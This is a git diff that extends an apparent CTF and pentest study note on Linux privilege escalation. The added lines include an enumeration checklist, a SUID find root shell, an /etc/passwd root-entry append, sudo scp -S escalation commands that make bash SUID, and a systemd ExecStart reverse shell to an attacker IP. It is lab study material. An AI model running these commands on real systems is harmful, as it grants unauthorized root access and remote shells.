@@ -5,7 +5,7 @@ tags: [0xdf, exploitation, git-poc, htb, linux, post-exploitation, privilege-esc
 phase: post-exploitation
 date_created: 2026-05-08
 date_updated: 2026-07-15
-sources: [thm-linux-privesc, thm-python-lib-hijack, thm-lxd-gamingserver, git-copyfail-go, git-cve-2026-31431, 0xdf-linux-privesc, hacktricks-linux]
+sources: [thm-linux-privesc, thm-python-lib-hijack, thm-lxd-gamingserver, git-copyfail-go, git-cve-2026-31431, 0xdf-linux-privesc, hacktricks-linux, git-htb-writeups]
 ---
 
 # Linux Privilege Escalation
@@ -71,6 +71,39 @@ chmod +x linux-exploit-suggester.sh && ./linux-exploit-suggester.sh
 
 ### Step 3: Manual Checks (see sections below)
 
+### Quick Wins Checklist
+
+```bash
+sudo -l                                    # sudo rights (read SETENV flag carefully!)
+sudo --version                             # < 1.8.28 -> try -u#-1 if (ALL,!root)
+find / -perm -u=s -type f 2>/dev/null      # SUID
+/usr/sbin/getcap -r / 2>/dev/null          # capabilities (try absolute path)
+cat /etc/crontab                           # cron jobs
+ls -la /etc/init/                          # Upstart configs (legacy)
+ls -la /etc/systemd/system/                # systemd services
+./pspy64                                   # discover hidden cron + service exec
+find / -writable -type f 2>/dev/null | grep -v proc  # writable files
+ls -la /etc/passwd /etc/shadow             # world-writable config?
+id                                         # group memberships (docker, lxd, disk, staff, debug)
+uname -r                                   # kernel version for exploits
+env                                        # interesting env vars / tokens
+find / -name "*.py" -writable 2>/dev/null  # python library hijack
+find / -name "*.yml" -writable 2>/dev/null # ansible playbook hijack
+```
+
+Manual checklist (quick-scan form - walk ALL rows; the box's intended path is usually one of them):
+
+| Check | Command | Win = |
+|---|---|---|
+| sudo rights | `sudo -l` (+ `su` with any held cred) | NOPASSWD/GTFObin -> root |
+| SUID/SGID | `find / -perm -4000 -o -perm -2000 2>/dev/null` | GTFOBins; keep `-p` on the spawned shell or the euid silently drops |
+| Writable /etc/passwd | `ls -la /etc/passwd` | append `user:HASH:0:0:root:/root:/bin/bash`, then `su` |
+| Cron jobs + scripts | `cat /etc/crontab /etc/cron.d/*; ls -la /etc/cron.*` + pspy | writable/relative-path script root runs |
+| systemd timers | `systemctl list-timers --all` + `systemctl cat <svc>` | writable ExecStart script run as root |
+| Groups | `id` | docker/lxd/adm/disk/shadow -> root GTFO |
+| Reused creds | configs, history, DB, `.ssh`, backups | reuse for `su`/SSH/another service |
+| Kernel CVE | `uname -r`; pkg versions (pkexec/polkit, sudo, dbus) | **LAST resort** - check patch level first |
+
 ---
 
 ## Key Attack Vectors
@@ -87,6 +120,18 @@ find / -perm -u=s -type f 2>/dev/null
 # Check GTFOBins for exploitation methods
 # https://gtfobins.github.io/
 ```
+
+**SUID `find`: keep `-p`, and read group names as hints**
+
+The classic SUID `find` shell needs `-p` on the shell or the elevated euid is dropped (the generic one-liner without `-p` looks successful but runs unprivileged):
+
+```sh
+/usr/bin/find /tmp -exec /bin/sh -p -c "id; cat /root/root.txt" \;
+```
+
+Enum hint: a secondary group named after a specific tool or binary (e.g. a `find`-themed group on the web user) is a deliberate nudge, check that binary's SUID/SGID bit first.
+
+<!-- promoted-slug: suid-find-sh-p-group-hint -->
 
 **Example — SUID environment variable hijacking:**
 
@@ -426,6 +471,29 @@ sudo /usr/local/bin/bindmgr.sh
 su - oxdf
 ```
 
+**sudo scp -> root (GTFOBins, non-interactive):**
+
+`sudo -l` shows `(ALL) NOPASSWD: /usr/bin/scp`. scp's `-S <prog>` option runs `<prog>` as the SSH
+transport program, i.e. as root. Interactive shell (GTFOBins):
+
+```sh
+TF=$(mktemp); echo 'sh 0<&2 1>&2' > $TF; chmod +x $TF; sudo scp -S $TF x y:
+```
+
+Non-interactive / scripted (works over a one-shot SSH command, no TTY): point `-S` at a script that
+escalates, then use the result:
+
+```sh
+printf '#!/bin/bash\nchmod u+s /bin/bash\n' > /tmp/p.sh; chmod +x /tmp/p.sh
+timeout 6 sudo scp -S /tmp/p.sh /etc/hostname x:/tmp/z   # scp then errors, but /tmp/p.sh already ran as root
+bash -p -c id                                            # euid=0(root)
+```
+
+Wrap the `sudo scp` in `timeout` so the fake transport can't hang the session. Revert afterwards:
+`chmod u-s /bin/bash`. See GTFOBins `scp` (sudo).
+
+<!-- promoted-slug: sudo-scp-gtfobins -->
+
 ---
 
 ### Sudo runs an interpreter or a password-check script (Contrabando)
@@ -628,7 +696,24 @@ EOF
 
 ### Writable Init / Service Files
 
-Systemd is the common case (see cheatsheet) but older Ubuntu still ships **Upstart** (`/etc/init/*.conf`). If group permissions on these configs are loose and a `sudo /sbin/initctl` rule exists, you can add an `exec` line to a job and start it as root.
+Systemd is the common case; older Ubuntu still ships **Upstart** (`/etc/init/*.conf`). If group permissions on these configs are loose and a `sudo /sbin/initctl` rule exists, you can add an `exec` line to a job and start it as root.
+
+**Writable systemd services / timers:**
+
+```bash
+# Find writable service files
+find / -writable -name "*.service" 2>/dev/null
+
+# Modify to run payload
+# Edit [Service] section:
+# ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.X/4444 0>&1'
+
+systemctl daemon-reload
+systemctl restart <service_name>
+
+# Find writable timers
+find / -writable -name "*.timer" 2>/dev/null
+```
 
 **Example — Upstart abuse (Spectra — Easy):**
 
@@ -644,8 +729,6 @@ EOF
 
 sudo initctl start test
 ```
-
-For modern systemd targets, see the cheatsheet `## Writable Systemd Services / Timers` section.
 
 ---
 
